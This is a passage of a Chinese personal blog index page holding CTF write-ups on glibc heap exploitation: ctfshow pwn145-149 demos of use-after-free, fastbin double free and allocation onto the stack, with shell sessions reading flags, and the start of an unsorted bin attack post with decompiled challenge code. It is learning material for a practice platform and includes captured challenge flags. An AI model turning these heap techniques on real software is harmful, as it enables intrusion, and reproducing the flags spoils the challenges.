<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="linkpwn的学习经历">
<meta property="og:type" content="website">
<meta property="og:title" content="网络幻影">
<meta property="og:url" content="http://linkpwn.github.io/page/3/index.html">
<meta property="og:site_name" content="网络幻影">
<meta property="og:description" content="linkpwn的学习经历">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="linkpwn">
<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://linkpwn.github.io/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>网络幻影</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta custom-logo">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">网络幻影</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
      <a>
        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
      </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            

	<div class="tag-cloud">
	  <div class="tag-cloud-tags" id="tags">
		
	  </div>
	</div>
	<br>
	
	<script type="text/javascript">
     var alltags = document.getElementsByClassName('tag-cloud-tags');
     var tags = alltags[0].getElementsByTagName('a');
     for (var i = tags.length - 1; i >= 0; i--) {
       var r=Math.floor(Math.random()*75+130);
       var g=Math.floor(Math.random()*75+100);
       var b=Math.floor(Math.random()*75+80);
       tags[i].style.background = "rgb("+r+","+g+","+b+")";
     }
</script>

<style>
  .tag-cloud-tags{
    /*font-family: Helvetica, Tahoma, Arial;*/
    /*font-weight: 100;*/
    text-align: center;
    counter-reset: tags;
  }
  .tag-cloud-tags a{
    border-radius: 6px;
    padding-right: 5px;
    padding-left: 5px;
    margin: 8px 5px 0px 0px;
  }
  .tag-cloud-tags a:before{
    content: "?";
  }

  .tag-cloud-tags a:hover{
     box-shadow: 0px 5px 15px 0px rgba(0,0,0,.4);
     transform: scale(1.1);
     /*box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);*/
     transition-duration: 0.15s;
  }
</style>

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/27/ctfshow-pwn145-158/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/27/ctfshow-pwn145-158/" class="post-title-link" itemprop="url">ctfshow pwn145-158</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-27 09:48:39" itemprop="dateCreated datePublished" datetime="2025-07-27T09:48:39+08:00">2025-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:40:25" itemprop="dateModified" datetime="2025-09-23T20:40:25+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="pwn-145"><a href="#pwn-145" class="headerlink" title="pwn 145"></a>pwn 145</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Why it can UAF(use after free) ?                        </span><br><span class="line">    * *************************************                           </span><br><span class="line">演示glibc 的分配机制</span><br><span class="line">glibc 使用首次适应算法选择空闲的堆块</span><br><span class="line">如果有一个空闲堆块且足够大，那么 malloc 将选择它</span><br><span class="line">如果存在 use-after-free 的情况那可以利用这一特性</span><br><span class="line">首先申请两个比较大的 chunk</span><br><span class="line">第一个 a = malloc(0x512) 在: 0x18f5260</span><br><span class="line">第二个 b = malloc(0x256) 在: 0x18f5780</span><br><span class="line">我们可以继续分配它</span><br><span class="line">现在我们把 &quot;AAAAAAAA&quot; 这个字符串写到 a 那里 </span><br><span class="line">第一次申请的 0x18f5260 指向 AAAAAAAA</span><br><span class="line">接下来 free 掉第一个...</span><br><span class="line">接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: 0x18f5260</span><br><span class="line">第三次 c = malloc(0x500) 在: 0x18f5260</span><br><span class="line">我们这次往里写一串 &quot;CCCCCCCC&quot; 到刚申请的 c 中</span><br><span class="line">第三次申请的 c 0x18f5260 指向 CCCCCCCC</span><br><span class="line">第一次申请的 a 0x18f5260 指向 CCCCCCCC</span><br><span class="line">可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 &quot;CCCCCCCC&quot;</span><br><span class="line">sh</span><br><span class="line">cat ctfshow_flag</span><br><span class="line">ctfshow&#123;3f139a53-9718-4b95-936c-a73c2296849b&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn146"><a href="#pwn146" class="headerlink" title="pwn146"></a>pwn146</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Why it can UAF(use after free) ?                        </span><br><span class="line">    * *************************************                           </span><br><span class="line">申请0x20大小的内存p1 的地址: 0x13ba010</span><br><span class="line">把p1[1]赋值为Printf函数，然后打印出&quot;Hello CTFshow&quot;</span><br><span class="line">Hello CTFshow</span><br><span class="line"></span><br><span class="line">free 掉 p1</span><br><span class="line">因为并没有置为null，所以p1[1]仍然是Printf函数，仍然可以输出打印了&quot;Hello CTFshow again&quot;</span><br><span class="line">Hello CTFshow again</span><br><span class="line">接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的</span><br><span class="line">p2 的地址: 0x13ba010</span><br><span class="line">p1 的地址: 0x13ba010</span><br><span class="line">然后把p2[1]给改成demoflag也就是system函数</span><br><span class="line"></span><br><span class="line">Then get the flag &amp;&amp; enjoy it !</span><br><span class="line"></span><br><span class="line">$sh</span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;5247ed61-a52c-4a9d-8dcd-53b8467a17ec&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn147"><a href="#pwn147" class="headerlink" title="pwn147"></a>pwn147</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup -- Double free                              </span><br><span class="line">    * *************************************                           </span><br><span class="line">演示 fastbin 的 double free</span><br><span class="line">首先申请 3 个 chunk</span><br><span class="line">第一个 malloc(8): 0x1b39010</span><br><span class="line">第二个 malloc(8): 0x1b39030</span><br><span class="line">第三个 malloc(8): 0x1b39050</span><br><span class="line">free 掉第一个</span><br><span class="line">当我们再次 free 0x1b39010 的时候, 程序将会崩溃因为 0x1b39010 在 free 链表的第一个位置上</span><br><span class="line">我们先 free 0x1b39030.</span><br><span class="line">现在我们就可以再次 free 0x1b39010 了, 因为他现在不在 free 链表的第一个位置上</span><br><span class="line">现在空闲链表是这样的 [ 0x1b39010, 0x1b39030, 0x1b39010 ]. 如果我们 malloc 三次, 我们会得到两次 0x1b39010 </span><br><span class="line">第一次 malloc(8): 0x1b39010</span><br><span class="line">第二次 malloc(8): 0x1b39030</span><br><span class="line">第三次 malloc(8): 0x1b39010</span><br><span class="line">$sh </span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;7dbdfb56-d36a-42a8-a804-0e990d4d61dc&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn148"><a href="#pwn148" class="headerlink" title="pwn148"></a>pwn148</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup_into_stack -- Double free                   </span><br><span class="line">    * *************************************                           </span><br><span class="line">通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）</span><br><span class="line">通过 malloc 申请到 0x7ffe9bec2270.</span><br><span class="line">先申请3 个 chunk</span><br><span class="line">chunk a: 0x25dd010</span><br><span class="line">chunk b: 0x25dd030</span><br><span class="line">chunk c: 0x25dd050</span><br><span class="line">free 掉 chunk a</span><br><span class="line">如果还对 0x25dd010 进行 free, 程序会崩溃。因为 0x25dd010 现在是 fastbin 的第一个</span><br><span class="line">先对 b 0x25dd030 进行 free</span><br><span class="line">接下来就可以对 0x25dd010 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了</span><br><span class="line">现在 fastbin 的链表是 [ 0x25dd010, 0x25dd030, 0x25dd010 ] 接下来通过修改 0x25dd010 上的内容来进行攻击.</span><br><span class="line">第一次 malloc(8): 0x25dd010</span><br><span class="line">第二次 malloc(8): 0x25dd030</span><br><span class="line">现在 fastbin 表中只剩 [ 0x25dd010 ] 了</span><br><span class="line">接下来往 0x25dd010 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去</span><br><span class="line">现在覆盖 0x25dd010 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置</span><br><span class="line">第三次 malloc(8): 0x25dd010, 把栈地址放到 fastbin 链表中</span><br><span class="line">这一次 malloc(8) 就申请到了栈上去: 0x7ffe9bec2270</span><br><span class="line">$sh</span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;f7fdefd4-fab4-4a29-96b0-8ccb6f648dc1&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn149"><a href="#pwn149" class="headerlink" title="pwn149"></a>pwn149</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ nc pwn.challenge.ctf.show 28266</span><br><span class="line">    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           </span><br><span class="line">  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           </span><br><span class="line"> ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██</span><br><span class="line"> ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀</span><br><span class="line"> ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ </span><br><span class="line">  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ </span><br><span class="line">    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Heap_Exploitation                                       </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Fastbin_dup_consolidate                                 </span><br><span class="line">    * *************************************                           </span><br><span class="line">申请两个 fastbin 范围内的 chunk: p1=0x197a010 p2=0x197a030</span><br><span class="line">先 free p1</span><br><span class="line">去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=0x197a050</span><br><span class="line">因为 malloc_consolidate(), p1 会被放到 unsorted bin 中</span><br><span class="line">这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free</span><br><span class="line">现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: 0x197a010 0x197a010</span><br><span class="line">$sh </span><br><span class="line">cat flag</span><br><span class="line">ctfshow&#123;2f30058c-812f-4649-9b5d-6298c5144bba&#125;</span><br></pre></td></tr></table></figure>

<p>写着写着发现一直写这个营养价值太低了，先停下把，以后发现了营养再来写。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/18/unsorted-bin-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/18/unsorted-bin-attack/" class="post-title-link" itemprop="url">unsorted bin attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-18 10:46:09" itemprop="dateCreated datePublished" datetime="2025-07-18T10:46:09+08:00">2025-07-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:08:27" itemprop="dateModified" datetime="2025-09-23T21:08:27+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>原理学习:unsorted bin attack就是能把某个地址的值改成很大，但是这个很大的值又不可控。（这里的ctfshow的pwn144涉及到了这个手法，但是不完全，以后碰到在接着总结）</p>
<h3 id="pwn144"><a href="#pwn144" class="headerlink" title="pwn144"></a>pwn144</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">114514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1BF52</span> ) <span class="comment">//修改magic大于0x1BF52即可达到后门函数</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          TaT();   <span class="comment">//后门函数</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span 